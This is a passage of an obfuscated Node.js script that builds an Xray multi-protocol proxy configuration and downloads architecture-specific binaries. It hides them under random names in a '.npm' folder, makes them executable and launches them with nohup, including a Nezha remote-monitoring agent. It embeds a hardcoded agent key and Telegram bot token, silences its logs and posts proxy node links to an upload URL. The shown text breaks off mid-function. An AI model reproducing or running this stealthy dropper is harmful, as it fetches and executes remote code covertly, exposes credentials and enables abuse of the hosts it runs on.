#!/usr/bin/env node

const _0x4f0683 = _0x1f2b
;(function (_0x468dde, _0x6bad6f) {
  const _0x213bad = { _0x3e5b44: 0x1d4, _0x3ddd3c: 0x238, _0x106bd2: 0x2e9, _0x48aefe: 0x2dd },
    _0x42b3e0 = _0x1f2b,
    _0x16aa7f = _0x468dde()
  while (!![]) {
    try {
      const _0x445c1b =
        parseInt(_0x42b3e0(0x28a)) / 0x1 +
        (-parseInt(_0x42b3e0(0x23e)) / 0x2) * (-parseInt(_0x42b3e0(0x292)) / 0x3) +
        (-parseInt(_0x42b3e0(0x2f0)) / 0x4) * (parseInt(_0x42b3e0(0x245)) / 0x5) +
        (-parseInt(_0x42b3e0(_0x213bad._0x3e5b44)) / 0x6) * (parseInt(_0x42b3e0(_0x213bad._0x3ddd3c)) / 0x7) +
        parseInt(_0x42b3e0(_0x213bad._0x106bd2)) / 0x8 +
        (parseInt(_0x42b3e0(0x2a8)) / 0x9) * (-parseInt(_0x42b3e0(_0x213bad._0x48aefe)) / 0xa) +
        -parseInt(_0x42b3e0(0x24c)) / 0xb
      if (_0x445c1b === _0x6bad6f) break
      else _0x16aa7f['push'](_0x16aa7f['shift']())
    } catch (_0x2de2ff) {
      _0x16aa7f['push'](_0x16aa7f['shift']())
    }
  }
})(_0x2251, 0xa6a27)
const http = require(_0x4f0683(0x2da)),
  axios = require(_0x4f0683(0x22c)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x4f0683(0x2c0)),
  crypto = require(_0x4f0683(0x2ea)),
  { promisify } = require('util'),
  { exec: execCommand, execSync } = require(_0x4f0683(0x232)),
  exec = promisify(execCommand),
  PORT = process['env'][_0x4f0683(0x22f)] || 0xbb8,
  SUB_PATH = process[_0x4f0683(0x2c3)][_0x4f0683(0x24e)] || '800',
  NAME = process[_0x4f0683(0x2c3)][_0x4f0683(0x1db)] || 'js-node',
  CFIP = process[_0x4f0683(0x2c3)][_0x4f0683(0x21c)] || _0x4f0683(0x2c9),
  CFPORT = process[_0x4f0683(0x2c3)][_0x4f0683(0x2bb)] || 0x1bb,
  UPLOAD_URL = process[_0x4f0683(0x2c3)][_0x4f0683(0x253)] || '',
  PROJECT_URL = process[_0x4f0683(0x2c3)][_0x4f0683(0x240)] || '',
  AUTO_ACCESS = process[_0x4f0683(0x2c3)]['AUTO_ACCESS'] || ![],
  FILE_PATH = process[_0x4f0683(0x2c3)][_0x4f0683(0x283)] || '.npm',
  NEZHA_SERVER = process['env'][_0x4f0683(0x241)] || 'nezha.933993.xyz:443',
  NEZHA_PORT = process[_0x4f0683(0x2c3)][_0x4f0683(0x29b)] || '',
  NEZHA_KEY = process[_0x4f0683(0x2c3)][_0x4f0683(0x2ca)] || '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
  UUID = process[_0x4f0683(0x2c3)]['UUID'] || _0x4f0683(0x2de),
  ARGO_AUTH = process['env'][_0x4f0683(0x1e9)] || _0x4f0683(0x291),
  ARGO_DOMAIN = process[_0x4f0683(0x2c3)][_0x4f0683(0x21f)] || _0x4f0683(0x266),
  ARGO_PORT = process[_0x4f0683(0x2c3)][_0x4f0683(0x1e6)] || 0xe2e1,
  S5_PORT = process['env']['S5_PORT'] || '',
  HY2_PORT = process['env'][_0x4f0683(0x1f0)] || '',
  REALITY_PORT = process[_0x4f0683(0x2c3)][_0x4f0683(0x24a)] || '',
  CHAT_ID = process[_0x4f0683(0x2c3)][_0x4f0683(0x265)] || _0x4f0683(0x2d6),
  BOT_TOKEN = process[_0x4f0683(0x2c3)]['BOT_TOKEN'] || '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
  SHOW_LOG = ![_0x4f0683(0x2a1), _0x4f0683(0x1d1), 'no'][_0x4f0683(0x1cc)](
    (process[_0x4f0683(0x2c3)][_0x4f0683(0x2e5)] || _0x4f0683(0x2a1))[_0x4f0683(0x27e)]()
  )
!SHOW_LOG && ((console[_0x4f0683(0x1e1)] = () => {}), (console['error'] = () => {}))
function alwaysLog(_0x4b83fe) {
  process['stdout']['write'](_0x4b83fe + '\x0a')
}
if (!fs[_0x4f0683(0x23a)](FILE_PATH)) fs['mkdirSync'](FILE_PATH)
else {
}
function _0x1f2b(_0x409ac4, _0x4ba8c5) {
  const _0x225149 = _0x2251()
  return (
    (_0x1f2b = function (_0x1f2bcb, _0x5926ee) {
      _0x1f2bcb = _0x1f2bcb - 0x1cc
      let _0x59c4b7 = _0x225149[_0x1f2bcb]
      return _0x59c4b7
    }),
    _0x1f2b(_0x409ac4, _0x4ba8c5)
  )
}
function isValidPort(_0x189ac6) {
  const _0x378143 = { _0x40ad55: 0x25b },
    _0x3ac46e = _0x4f0683
  try {
    if (_0x189ac6 === null || _0x189ac6 === undefined || _0x189ac6 === '') return ![]
    if (typeof _0x189ac6 === _0x3ac46e(0x1f2) && _0x189ac6[_0x3ac46e(_0x378143._0x40ad55)]() === '') return ![]
    const _0x4cf215 = parseInt(_0x189ac6)
    if (isNaN(_0x4cf215)) return ![]
    if (_0x4cf215 < 0x1 || _0x4cf215 > 0xffff) return ![]
    return !![]
  } catch (_0x200ce2) {
    return ![]
  }
}
function generateRandomName() {
  const _0x43091a = { _0x1359d3: 0x1fc, _0x19b050: 0x223 },
    _0x237d17 = _0x4f0683,
    _0x5e75e3 = _0x237d17(_0x43091a._0x1359d3)
  let _0x33547b = ''
  for (let _0x3bf656 = 0x0; _0x3bf656 < 0x6; _0x3bf656++) {
    _0x33547b += _0x5e75e3[_0x237d17(0x2a9)](Math[_0x237d17(_0x43091a._0x19b050)](Math[_0x237d17(0x2c5)]() * _0x5e75e3['length']))
  }
  return _0x33547b
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path[_0x4f0683(0x229)](FILE_PATH, npmName),
  phpPath = path[_0x4f0683(0x229)](FILE_PATH, phpName),
  webPath = path[_0x4f0683(0x229)](FILE_PATH, webName),
  botPath = path[_0x4f0683(0x229)](FILE_PATH, botName),
  subPath = path[_0x4f0683(0x229)](FILE_PATH, 'sub.txt'),
  listPath = path[_0x4f0683(0x229)](FILE_PATH, _0x4f0683(0x262)),
  bootLogPath = path[_0x4f0683(0x229)](FILE_PATH, 'boot.log'),
  configPath = path[_0x4f0683(0x229)](FILE_PATH, _0x4f0683(0x243)),
  certPath = path['resolve'](FILE_PATH, _0x4f0683(0x273)),
  keyPath = path[_0x4f0683(0x29d)](FILE_PATH, _0x4f0683(0x246))
function deleteNodes() {
  const _0x165101 = { _0x3a5310: 0x23a, _0x35034: 0x277, _0x1d4487: 0x2ac, _0x1a85b3: 0x21b, _0x2b6a72: 0x210, _0x2c9717: 0x203 },
    _0x329de9 = _0x4f0683
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x329de9(_0x165101._0x3a5310)](subPath)) return
    let _0x40c37e
    try {
      _0x40c37e = fs[_0x329de9(_0x165101._0x35034)](subPath, 'utf-8')
    } catch {
      return null
    }
    const _0x1cc264 = Buffer[_0x329de9(_0x165101._0x1d4487)](_0x40c37e, _0x329de9(_0x165101._0x1a85b3))['toString']('utf-8'),
      _0x4cbbc1 = _0x1cc264[_0x329de9(_0x165101._0x2b6a72)]('\x0a')[_0x329de9(0x1fb)]((_0x80bc24) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//['test'](_0x80bc24)
      )
    if (_0x4cbbc1[_0x329de9(0x207)] === 0x0) return
    return (
      axios[_0x329de9(0x251)](UPLOAD_URL + _0x329de9(_0x165101._0x2c9717), JSON['stringify']({ nodes: _0x4cbbc1 }), {
        headers: { 'Content-Type': _0x329de9(0x228) }
      })[_0x329de9(0x20c)]((_0xd62907) => {
        return null
      }),
      null
    )
  } catch (_0x5bab28) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x45387a = { _0x1ff303: 0x248 }
  try {
    const _0x2dee5b = fs['readdirSync'](FILE_PATH)
    _0x2dee5b['forEach']((_0x396b1d) => {
      const _0x4d6c63 = _0x1f2b,
        _0x5f0596 = path[_0x4d6c63(0x229)](FILE_PATH, _0x396b1d)
      try {
        const _0x2b513b = fs[_0x4d6c63(0x1ec)](_0x5f0596)
        _0x2b513b[_0x4d6c63(_0x45387a._0x1ff303)]() && fs[_0x4d6c63(0x2a6)](_0x5f0596)
      } catch (_0x2049b4) {}
    })
  } catch (_0x3fae4f) {}
}
function generateX25519Keypair() {
  const _0x1941e1 = { _0x7898d: 0x281, _0x4ad965: 0x249, _0x4928e6: 0x2ee, _0x24f37a: 0x1dd, _0x4bbbc1: 0x2ec },
    _0x173151 = _0x4f0683,
    { publicKey: _0x274c01, privateKey: _0x16769d } = crypto['generateKeyPairSync']('x25519'),
    _0x4c0763 = _0x16769d[_0x173151(0x281)]({ type: 'pkcs8', format: _0x173151(0x1f4) })['subarray'](-0x20),
    _0x4abe8e = _0x274c01[_0x173151(_0x1941e1._0x7898d)]({ type: _0x173151(_0x1941e1._0x4ad965), format: _0x173151(0x1f4) })[
      _0x173151(_0x1941e1._0x4928e6)
    ](-0x20)
  return { privateKey: _0x4c0763['toString']('base64url'), publicKey: _0x4abe8e[_0x173151(_0x1941e1._0x24f37a)](_0x173151(_0x1941e1._0x4bbbc1)) }
}
function generateOrLoadKeyPair() {
  const _0x5fd897 = {
      _0x484d5c: 0x229,
      _0x3584fb: 0x27b,
      _0x3617ef: 0x277,
      _0x521c19: 0x204,
      _0x187a66: 0x1f5,
      _0x1ab605: 0x1e1,
      _0x129a00: 0x287,
      _0x5dc7f0: 0x1e1,
      _0x53ad66: 0x1ed
    },
    _0x594040 = _0x4f0683,
    _0x4c2aac = path[_0x594040(_0x5fd897._0x484d5c)](FILE_PATH, _0x594040(_0x5fd897._0x3584fb))
  if (fs[_0x594040(0x23a)](_0x4c2aac)) {
    const _0x558d4a = fs[_0x594040(_0x5fd897._0x3617ef)](_0x4c2aac, _0x594040(_0x5fd897._0x521c19)),
      _0x17b9ef = _0x558d4a[_0x594040(_0x5fd897._0x187a66)](/PrivateKey:\s*(.*)/),
      _0x5ed889 = _0x558d4a[_0x594040(_0x5fd897._0x187a66)](/PublicKey:\s*(.*)/)
    if (_0x17b9ef && _0x5ed889) {
      ;((privateKey = _0x17b9ef[0x1][_0x594040(0x25b)]()),
        (publicKey = _0x5ed889[0x1][_0x594040(0x25b)]()),
        console[_0x594040(_0x5fd897._0x1ab605)](_0x594040(0x1ed), privateKey),
        console[_0x594040(_0x5fd897._0x1ab605)](_0x594040(0x1d8), publicKey))
      return
    }
  }
  const _0x16cad9 = generateX25519Keypair()
  ;((privateKey = _0x16cad9['privateKey']),
    (publicKey = _0x16cad9[_0x594040(0x20b)]),
    fs['writeFileSync'](_0x4c2aac, _0x594040(0x26a) + privateKey + _0x594040(_0x5fd897._0x129a00) + publicKey + '\x0a', _0x594040(0x204)),
    console[_0x594040(_0x5fd897._0x5dc7f0)](_0x594040(_0x5fd897._0x53ad66), privateKey),
    console[_0x594040(_0x5fd897._0x1ab605)](_0x594040(0x1d8), publicKey))
}
const FALLBACK_EC_KEY =
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a' +
    _0x4f0683(0x280) +
    _0x4f0683(0x215) +
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a' +
    _0x4f0683(0x2d2) +
    _0x4f0683(0x1fe) +
    _0x4f0683(0x202) +
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
  FALLBACK_CERT =
    _0x4f0683(0x2d8) +
    _0x4f0683(0x217) +
    _0x4f0683(0x208) +
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a' +
    _0x4f0683(0x2ed) +
    _0x4f0683(0x2e4) +
    _0x4f0683(0x2ab) +
    _0x4f0683(0x299) +
    _0x4f0683(0x218) +
    _0x4f0683(0x1ef)
function ensureTlsCertificates(_0x298dad, _0xd280d3) {
  const _0x510e59 = { _0xd8bbc5: 0x23a, _0x4e0c9c: 0x25f, _0x2e8649: 0x1df, _0xba41e2: 0x1e0, _0x3b7bcd: 0x1e0 },
    _0x5d2367 = _0x4f0683
  if (fs[_0x5d2367(0x23a)](_0x298dad) && fs[_0x5d2367(_0x510e59._0xd8bbc5)](_0xd280d3)) return
  fs[_0x5d2367(_0x510e59._0x4e0c9c)](path[_0x5d2367(0x20f)](_0x298dad), { recursive: !![] })
  try {
    ;(execSync('openssl\x20version', { stdio: _0x5d2367(_0x510e59._0x2e8649) }),
      execSync(_0x5d2367(0x255) + _0xd280d3 + '\x22', { stdio: _0x5d2367(_0x510e59._0x2e8649) }),
      execSync(_0x5d2367(0x1e8) + _0xd280d3 + _0x5d2367(0x24f) + _0x298dad + '\x22\x20-subj\x20\x22/CN=bing.com\x22', {
        stdio: _0x5d2367(_0x510e59._0x2e8649)
      }))
    return
  } catch (_0x51074a) {}
  ;(fs[_0x5d2367(_0x510e59._0xba41e2)](_0xd280d3, FALLBACK_EC_KEY), fs[_0x5d2367(_0x510e59._0x3b7bcd)](_0x298dad, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x20a304) {
  const _0x222073 = {
      _0x5f394a: 0x2e8,
      _0x5d4e0c: 0x204,
      _0x101030: 0x1f5,
      _0x472e7c: 0x2ac,
      _0x5a3d4f: 0x21b,
      _0x357133: 0x1d5,
      _0x3285ce: 0x288,
      _0x3f45ec: 0x263,
      _0x58ac7b: 0x206
    },
    _0x3c9526 = _0x4f0683
  try {
    const _0x51a8f6 = execSync(_0x3c9526(_0x222073._0x5f394a) + _0x20a304 + '\x22', { encoding: _0x3c9526(_0x222073._0x5d4e0c), timeout: 0xbb8 })[
        _0x3c9526(0x25b)
      ](),
      _0x8acbd0 = _0x51a8f6[_0x3c9526(0x1f5)](/=(.+)$/)
    if (_0x8acbd0 && _0x8acbd0[0x1]) return _0x8acbd0[0x1]['toUpperCase']()
  } catch (_0xfb4745) {}
  try {
    const _0x59a7db = fs['readFileSync'](_0x20a304, 'utf8'),
      _0x2458d3 = _0x59a7db[_0x3c9526(_0x222073._0x101030)](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x2458d3) return ''
    const _0x52a65c = _0x2458d3[0x1][_0x3c9526(0x236)](/\s/g, ''),
      _0x3f117e = Buffer[_0x3c9526(_0x222073._0x472e7c)](_0x52a65c, _0x3c9526(_0x222073._0x5a3d4f)),
      _0x31c5b = crypto[_0x3c9526(_0x222073._0x357133)](_0x3c9526(0x21a))
        [_0x3c9526(_0x222073._0x3285ce)](_0x3f117e)
        [_0x3c9526(_0x222073._0x3f45ec)](_0x3c9526(0x20a))
    return _0x31c5b[_0x3c9526(_0x222073._0x101030)](/.{2}/g)[_0x3c9526(0x229)](':')['toUpperCase']()
  } catch (_0x128c6b) {
    return (console['error'](_0x3c9526(_0x222073._0x58ac7b), _0x128c6b), '')
  }
}
async function generateConfig() {
  const _0x3f00e7 = {
      _0x3191e4: 0x289,
      _0x46893a: 0x2c6,
      _0x5ca35b: 0x20e,
      _0x71d8c8: 0x221,
      _0x36149b: 0x2b2,
      _0x141274: 0x290,
      _0x3c00bc: 0x2da,
      _0x348e06: 0x231,
      _0x34e726: 0x2cb,
      _0x29aecb: 0x29a,
      _0x3917c0: 0x275,
      _0x39a0b1: 0x2c1,
      _0xe71846: 0x256,
      _0x34147f: 0x1e7,
      _0x231534: 0x220,
      _0x551c14: 0x2e3,
      _0x1cecaf: 0x237,
      _0x4174e3: 0x2a5,
      _0x2876dc: 0x26f,
      _0x330898: 0x235,
      _0x427dba: 0x2d1
    },
    _0x33ee9b = _0x4f0683,
    _0x1108b0 = {
      log: { access: _0x33ee9b(_0x3f00e7._0x3191e4), error: _0x33ee9b(0x289), loglevel: _0x33ee9b(_0x3f00e7._0x46893a) },
      inbounds: [
        {
          tag: 'vless-fallback-in',
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x33ee9b(_0x3f00e7._0x5ca35b),
          settings: {
            clients: [{ id: UUID, flow: _0x33ee9b(0x220) }],
            decryption: _0x33ee9b(0x2c6),
            fallbacks: [
              { dest: 0xbb9 },
              { path: _0x33ee9b(0x221), dest: 0xbba },
              { path: _0x33ee9b(0x290), dest: 0xbbb },
              { path: _0x33ee9b(0x231), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x33ee9b(0x29f) }
        },
        {
          tag: _0x33ee9b(0x2a4),
          port: 0xbb9,
          listen: _0x33ee9b(0x24b),
          protocol: _0x33ee9b(0x20e),
          settings: { clients: [{ id: UUID }], decryption: 'none' },
          streamSettings: { network: _0x33ee9b(0x29f), security: _0x33ee9b(0x2c6) }
        },
        {
          tag: _0x33ee9b(0x1d7),
          port: 0xbba,
          listen: _0x33ee9b(0x24b),
          protocol: 'vless',
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: 'none' },
          streamSettings: { network: 'ws', security: _0x33ee9b(0x2c6), wsSettings: { path: _0x33ee9b(_0x3f00e7._0x71d8c8) } },
          sniffing: { enabled: !![], destOverride: ['http', 'tls', _0x33ee9b(0x2b7)], metadataOnly: ![] }
        },
        {
          tag: 'vmess-ws-in',
          port: 0xbbb,
          listen: _0x33ee9b(0x24b),
          protocol: _0x33ee9b(_0x3f00e7._0x36149b),
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x33ee9b(_0x3f00e7._0x141274) } },
          sniffing: { enabled: !![], destOverride: [_0x33ee9b(_0x3f00e7._0x3c00bc), 'tls', 'quic'], metadataOnly: ![] }
        },
        {
          tag: 'trojan-ws-in',
          port: 0xbbc,
          listen: _0x33ee9b(0x24b),
          protocol: _0x33ee9b(0x1da),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x33ee9b(_0x3f00e7._0x46893a), wsSettings: { path: _0x33ee9b(_0x3f00e7._0x348e06) } },
          sniffing: { enabled: !![], destOverride: ['http', _0x33ee9b(_0x3f00e7._0x34e726), _0x33ee9b(0x2b7)], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x33ee9b(0x2c4)] },
      outbounds: [
        { protocol: _0x33ee9b(_0x3f00e7._0x29aecb), tag: _0x33ee9b(0x1f8) },
        { protocol: 'blackhole', tag: _0x33ee9b(_0x3f00e7._0x3917c0) }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x1108b0[_0x33ee9b(_0x3f00e7._0x39a0b1)][_0x33ee9b(_0x3f00e7._0xe71846)]({
      tag: _0x33ee9b(_0x3f00e7._0x34147f),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: _0x33ee9b(0x20e),
      settings: { clients: [{ id: UUID, flow: _0x33ee9b(_0x3f00e7._0x231534) }], decryption: 'none' },
      streamSettings: {
        network: _0x33ee9b(_0x3f00e7._0x551c14),
        security: _0x33ee9b(_0x3f00e7._0x1cecaf),
        realitySettings: { show: ![], dest: _0x33ee9b(0x27f), xver: 0x0, serverNames: ['www.iij.ad.jp'], privateKey: privateKey, shortIds: [''] }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x1108b0[_0x33ee9b(_0x3f00e7._0x39a0b1)][_0x33ee9b(_0x3f00e7._0xe71846)]({
        tag: _0x33ee9b(_0x3f00e7._0x4174e3),
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0x33ee9b(_0x3f00e7._0x2876dc),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: _0x33ee9b(0x26f),
          hysteriaSettings: { version: 0x2, masquerade: { type: 'proxy', url: 'https://bing.com' } },
          security: 'tls',
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x1108b0[_0x33ee9b(0x2c1)][_0x33ee9b(_0x3f00e7._0xe71846)]({
        tag: _0x33ee9b(0x2d7),
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: _0x33ee9b(_0x3f00e7._0x330898),
        settings: {
          auth: _0x33ee9b(0x242),
          accounts: [{ user: UUID[_0x33ee9b(0x1f6)](0x0, 0x8), pass: UUID[_0x33ee9b(_0x3f00e7._0x427dba)](-0xc) }],
          udp: !![]
        }
      }),
    fs['writeFileSync'](path[_0x33ee9b(0x229)](FILE_PATH, 'config.json'), JSON[_0x33ee9b(0x2dc)](_0x1108b0, null, 0x2)))
}
function getSystemArchitecture() {
  const _0x400a73 = { _0x129704: 0x294, _0x33cfbb: 0x2df },
    _0x51ed46 = _0x4f0683,
    _0x372b3b = os['arch']()
  return _0x372b3b === 'arm' || _0x372b3b === _0x51ed46(0x219) || _0x372b3b === _0x51ed46(_0x400a73._0x129704)
    ? _0x51ed46(_0x400a73._0x33cfbb)
    : 'amd'
}
function downloadFile(_0x4d9dce, _0xeee301, _0x5cccb1) {
  const _0x269211 = { _0x37f436: 0x2ce },
    _0x3265be = { _0x56226e: 0x22a, _0x390341: 0x28b, _0x47a33c: 0x1f1 },
    _0x4b9157 = { _0x117351: 0x200, _0x4ab71e: 0x2a2 },
    _0x4efcaa = _0x4f0683,
    _0x29c9f7 = _0x4d9dce,
    _0x261bd7 = _0x29c9f7 + '.download'
  !fs['existsSync'](FILE_PATH) && fs['mkdirSync'](FILE_PATH, { recursive: !![] })
  const _0xa56a4e = fs[_0x4efcaa(0x23f)](_0x261bd7)
  axios({ method: _0x4efcaa(0x1d2), url: _0xeee301, responseType: 'stream' })
    [_0x4efcaa(_0x269211._0x37f436)]((_0x1bd50e) => {
      const _0x285dd7 = { _0x32e425: 0x298, _0x4810ac: 0x22a, _0xdfb02d: 0x1f1 },
        _0x6cb13c = _0x4efcaa
      ;(_0x1bd50e['data'][_0x6cb13c(_0x4b9157._0x117351)](_0xa56a4e),
        _0xa56a4e['on'](_0x6cb13c(_0x4b9157._0x4ab71e), () => {
          const _0x16915b = { _0xdc23f8: 0x298, _0x1e2789: 0x1fa, _0x76d3e0: 0x2d4, _0x10244e: 0x1e1, _0x38b40d: 0x298, _0x3de37f: 0x205 }
          _0xa56a4e['close']((_0x2aee6c) => {
            const _0x23858a = _0x1f2b
            if (_0x2aee6c) {
              const _0x813502 = 'Download\x20' + path[_0x23858a(_0x16915b._0xdc23f8)](_0x29c9f7) + _0x23858a(0x22a) + _0x2aee6c[_0x23858a(0x28b)]
              ;(fs[_0x23858a(_0x16915b._0x1e2789)](_0x261bd7, () => {}), console[_0x23858a(0x1f1)](_0x813502), _0x5cccb1(_0x813502))
              return
            }
            try {
              fs[_0x23858a(0x22d)](_0x261bd7, _0x29c9f7)
            } catch (_0x411e1f) {
              const _0x59e760 = _0x23858a(_0x16915b._0x76d3e0) + path['basename'](_0x29c9f7) + _0x23858a(0x22a) + _0x411e1f[_0x23858a(0x28b)]
              ;(fs[_0x23858a(0x1fa)](_0x261bd7, () => {}), console['error'](_0x59e760), _0x5cccb1(_0x59e760))
              return
            }
            ;(console[_0x23858a(_0x16915b._0x10244e)](
              _0x23858a(_0x16915b._0x76d3e0) + path[_0x23858a(_0x16915b._0x38b40d)](_0x29c9f7) + _0x23858a(_0x16915b._0x3de37f)
            ),
              _0x5cccb1(null, _0x29c9f7))
          })
        }),
        _0xa56a4e['on']('error', (_0x14e6a4) => {
          const _0x521d33 = _0x6cb13c
          fs[_0x521d33(0x1fa)](_0x261bd7, () => {})
          const _0x23383c =
            'Download\x20' + path[_0x521d33(_0x285dd7._0x32e425)](_0x29c9f7) + _0x521d33(_0x285dd7._0x4810ac) + _0x14e6a4[_0x521d33(0x28b)]
          ;(console[_0x521d33(_0x285dd7._0xdfb02d)](_0x23383c), _0x5cccb1(_0x23383c))
        }))
    })
    [_0x4efcaa(0x20c)]((_0x308faa) => {
      const _0x383880 = _0x4efcaa
      fs[_0x383880(0x1fa)](_0x261bd7, () => {})
      const _0x477af3 = _0x383880(0x2d4) + path['basename'](_0x29c9f7) + _0x383880(_0x3265be._0x56226e) + _0x308faa[_0x383880(_0x3265be._0x390341)]
      ;(console[_0x383880(_0x3265be._0x47a33c)](_0x477af3), _0x5cccb1(_0x477af3))
    })
}
async function downloadFilesAndRun() {
  const _0x25b412 = {
      _0x525e33: 0x1f1,
      _0x490261: 0x2ef,
      _0x56ad6a: 0x201,
      _0x480d94: 0x2a1,
      _0x322ca1: 0x1f3,
      _0x162c2f: 0x286,
      _0x40c373: 0x2b8,
      _0x4644cb: 0x261,
      _0xd70a8a: 0x1e5,
      _0x282159: 0x214,
      _0x8c25a9: 0x268,
      _0x492ff3: 0x2ad,
      _0x228623: 0x2a3,
      _0x45cf4c: 0x26d,
      _0x46cf34: 0x29d,
      _0x1d1db1: 0x233,
      _0x35a8f8: 0x2ae,
      _0x5e1750: 0x1eb,
      _0x240493: 0x1e1,
      _0x2e9574: 0x2e6
    },
    _0x256030 = _0x4f0683,
    _0x8513f9 = getSystemArchitecture(),
    _0x53b7bd = getFilesForArchitecture(_0x8513f9)
  if (_0x53b7bd[_0x256030(0x207)] === 0x0) {
    console[_0x256030(0x1e1)](_0x256030(0x21e))
    return
  }
  const _0x453e34 = _0x53b7bd['map']((_0x40aee6) => {
    return new Promise((_0x4c9e58, _0x2094d9) => {
      const _0x10271c = { _0x5bff24: 0x22b, _0x484302: 0x1cf },
        _0x338917 = (_0x2e1782) => {
          const _0x22a9e4 = { _0x465b69: 0x1e1, _0x49c4a8: 0x2b0 },
            _0x37d5ed = _0x1f2b
          downloadFile(_0x40aee6[_0x37d5ed(_0x10271c._0x5bff24)], _0x40aee6[_0x37d5ed(_0x10271c._0x484302)][_0x2e1782], (_0x51d8c2, _0x39874f) => {
            const _0x3867b7 = _0x37d5ed
            if (!_0x51d8c2) {
              _0x4c9e58(_0x39874f)
              return
            }
            if (_0x2e1782 + 0x1 < _0x40aee6[_0x3867b7(0x1cf)][_0x3867b7(0x207)]) {
              ;(console[_0x3867b7(_0x22a9e4._0x465b69)](
                _0x3867b7(_0x22a9e4._0x49c4a8) + path[_0x3867b7(0x298)](_0x40aee6['fileName']) + _0x3867b7(0x272)
              ),
                _0x338917(_0x2e1782 + 0x1))
              return
            }
            _0x2094d9(_0x51d8c2)
          })
        }
      _0x338917(0x0)
    })
  })
  try {
    await Promise[_0x256030(0x209)](_0x453e34)
  } catch (_0x483d82) {
    console[_0x256030(_0x25b412._0x525e33)](_0x256030(0x2b4), _0x483d82)
    return
  }
  function _0x3a969a(_0x4bc075) {
    const _0x59dcf6 = { _0x1a8464: 0x1f1 },
      _0x5afd81 = _0x256030,
      _0xc3779a = 0x1fd
    _0x4bc075[_0x5afd81(0x1d3)]((_0x519422) => {
      const _0x17a7d3 = _0x5afd81
      if (fs[_0x17a7d3(0x23a)](_0x519422))
        try {
          ;(fs['chmodSync'](_0x519422, _0xc3779a),
            console['log']('Empowerment\x20success\x20for\x20' + _0x519422 + ':\x20' + _0xc3779a[_0x17a7d3(0x1dd)](0x8)))
        } catch (_0x5c4891) {
          console[_0x17a7d3(_0x59dcf6._0x1a8464)](_0x17a7d3(0x28d) + _0x519422 + ':\x20' + _0x5c4891)
        }
    })
  }
  const _0x4a5653 = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x3a969a(_0x4a5653)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x1b2fa0 = NEZHA_SERVER['includes'](':') ? NEZHA_SERVER[_0x256030(0x210)](':')['pop']() : '',
        _0x3359c8 = new Set([_0x256030(0x244), _0x256030(_0x25b412._0x490261), _0x256030(0x1e5), '2087', _0x256030(0x247), _0x256030(0x293)]),
        _0x55404c = _0x3359c8[_0x256030(_0x25b412._0x56ad6a)](_0x1b2fa0) ? 'true' : _0x256030(_0x25b412._0x480d94),
        _0x2daa86 =
          _0x256030(0x27a) + NEZHA_KEY + _0x256030(0x295) + NEZHA_SERVER + _0x256030(_0x25b412._0x322ca1) + _0x55404c + _0x256030(0x226) + UUID
      fs[_0x256030(0x1e0)](path['join'](FILE_PATH, _0x256030(_0x25b412._0x162c2f)), _0x2daa86)
      const _0xae2772 = _0x256030(0x268) + phpPath + _0x256030(_0x25b412._0x40c373) + FILE_PATH + _0x256030(_0x25b412._0x4644cb)
      try {
        ;(await exec(_0xae2772),
          console[_0x256030(0x1e1)](phpName + '\x20is\x20running'),
          await new Promise((_0x4f5f5d) => setTimeout(_0x4f5f5d, 0x3e8)))
      } catch (_0x5f05c8) {
        console[_0x256030(0x1f1)](_0x256030(0x254) + _0x5f05c8)
      }
    } else {
      let _0x12fc5d = ''
      const _0x3de171 = [_0x256030(0x244), '8443', _0x256030(_0x25b412._0xd70a8a), _0x256030(_0x25b412._0x282159), _0x256030(0x247), _0x256030(0x293)]
      _0x3de171['includes'](NEZHA_PORT) && (_0x12fc5d = '--tls')
      const _0x19c8f7 =
        'nohup\x20' +
        npmPath +
        _0x256030(0x297) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x256030(0x26e) +
        NEZHA_KEY +
        '\x20' +
        _0x12fc5d +
        _0x256030(0x2cf)
      try {
        ;(await exec(_0x19c8f7), console['log'](npmName + _0x256030(0x2e6)), await new Promise((_0x4faafb) => setTimeout(_0x4faafb, 0x3e8)))
      } catch (_0x44d6cf) {
        console['error'](_0x256030(0x28e) + _0x44d6cf)
      }
    }
  } else console[_0x256030(0x1e1)](_0x256030(0x2bd))
  const _0x553540 = _0x256030(_0x25b412._0x8c25a9) + webPath + _0x256030(0x2d0) + FILE_PATH + _0x256030(_0x25b412._0x492ff3)
  try {
